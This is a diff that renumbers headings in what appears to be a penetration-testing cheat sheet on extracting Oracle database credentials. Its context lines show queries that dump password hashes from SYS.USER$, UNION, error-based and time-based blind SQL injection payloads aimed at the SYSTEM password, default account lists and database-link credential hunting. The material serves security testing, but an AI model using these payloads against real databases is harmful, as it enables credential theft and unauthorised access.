@@ -7,11 +7,9 @@ tags: ["credentials", "users", "passwords"]
 lastUpdated: 2025-03-15
 ---
 
-## Database Credentials
-
 Extracting database credentials is a critical objective in Oracle database penetration testing. Oracle secures credentials in various system tables with different levels of encryption depending on the version. This knowledge facilitates privilege escalation and lateral movement.
 
-### System Tables with User Information
+## System Tables with User Information
 
 Oracle stores user credential information in several system tables and views:
 
@@ -24,7 +22,7 @@ Oracle stores user credential information in several system tables and views:
 | `V$SESSION`      | Currently connected users           | Medium                |
 | `V$PWFILE_USERS` | Database administrators             | Medium                |
 
-### Current User Context
+## Current User Context
 
 To retrieve information about the current database session:
 
@@ -39,9 +37,9 @@ SELECT username, osuser, machine, program FROM v$session WHERE audsid = USERENV(
 SELECT * FROM session_privs;
 ```
 
-### Listing Database Users
+## Listing Database Users
 
-#### Basic User Enumeration (Low Privileges)
+### Basic User Enumeration (Low Privileges)
 
 ```sql
 -- List all database users
@@ -56,7 +54,7 @@ WHERE username IN ('SYS', 'SYSTEM', 'DBSNMP', 'MDSYS', 'OUTLN', 'SCOTT', 'FLOWS_
 AND account_status = 'OPEN';
 ```
 
-#### Detailed User Information (DBA Privileges)
+### Detailed User Information (DBA Privileges)
 
 ```sql
 -- Comprehensive user information (requires higher privileges)
@@ -68,7 +66,7 @@ FROM dba_users ORDER BY created DESC;
 SELECT grantee FROM dba_role_privs WHERE granted_role = 'DBA';
 ```
 
-### Password Hashes
+## Password Hashes
 
 Oracle password hashes are stored in the `SYS.USER$` table, but format and accessibility vary by version:
 
@@ -83,9 +81,9 @@ SELECT name, password, spare4 FROM sys.user$ WHERE password IS NOT NULL;
 SELECT name, password AS versions_pw, spare4 AS pw12c FROM sys.user$ WHERE password IS NOT NULL;
 ```
 
-### SQL Injection Examples
+## SQL Injection Examples
 
-#### UNION Attacks for User Enumeration
+### UNION Attacks for User Enumeration
 
 ```sql
 -- Basic user listing via UNION attack
@@ -95,7 +93,7 @@ SELECT name, password AS versions_pw, spare4 AS pw12c FROM sys.user$ WHERE passw
 ' UNION SELECT username||'~'||account_status,NULL FROM all_users--
 ```
 
-#### Error-Based Extraction
+### Error-Based Extraction
 
 ```sql
 -- Extract user information through error messages
@@ -105,7 +103,7 @@ SELECT name, password AS versions_pw, spare4 AS pw12c FROM sys.user$ WHERE passw
 ' AND CTXSYS.DRITHSX.SN(1,(SELECT password FROM sys.user$ WHERE name='SYSTEM'))=1--
 ```
 
-#### Blind Extraction Techniques
+### Blind Extraction Techniques
 
 ```sql
 -- Boolean-based blind
@@ -116,7 +114,7 @@ SELECT name, password AS versions_pw, spare4 AS pw12c FROM sys.user$ WHERE passw
      THEN dbms_pipe.receive_message('x',10) ELSE NULL END) IS NULL--
 ```
 
-### Default/Common Oracle User Accounts
+## Default/Common Oracle User Accounts
 
 Oracle databases often contain default accounts that may have weak or default passwords:
 
@@ -131,7 +129,7 @@ Oracle databases often contain default accounts that may have weak or default pa
 | MDSYS     | MDSYS                                   | Spatial data account             |
 | OUTLN     | OUTLN                                   | Stored outlines for optimization |
 
-### Oracle Database Link Credentials
+## Oracle Database Link Credentials
 
 Database links may contain embedded credentials that can be extracted:
 
@@ -147,7 +145,7 @@ SELECT owner, db_link, username, host, created
 FROM all_db_links;
 ```
 
-### Password Policies and Profiles
+## Password Policies and Profiles
 
 Understanding password policies can aid in guessing or cracking passwords:
 
@@ -163,9 +161,9 @@ SELECT * FROM dba_profiles WHERE resource_name IN
 SELECT username, profile FROM dba_users;
 ```
 
-### Advanced Credential Hunting
+## Advanced Credential Hunting
 
-#### Finding Hard-coded Credentials in PL/SQL Code
+### Finding Hard-coded Credentials in PL/SQL Code
 
 ```sql
 -- Search for keywords in stored procedures
@@ -177,7 +175,7 @@ SELECT owner, name, text FROM all_source
 WHERE text LIKE '%DBMS_CRYPTO%' OR text LIKE '%DBMS_OBFUSCATION_TOOLKIT%';
 ```
 
-#### Exploring External Authentication Information
+### Exploring External Authentication Information
 
 ```sql
 -- Check for externally authenticated users
@@ -187,7 +185,7 @@ SELECT username FROM dba_users WHERE authentication_type = 'EXTERNAL';
 SELECT username FROM dba_users WHERE authentication_type = 'GLOBAL';
 ```
 
-### Real-world Attack Patterns
+## Real-world Attack Patterns
 
 ```sql
 -- Chain of attacks for credential access
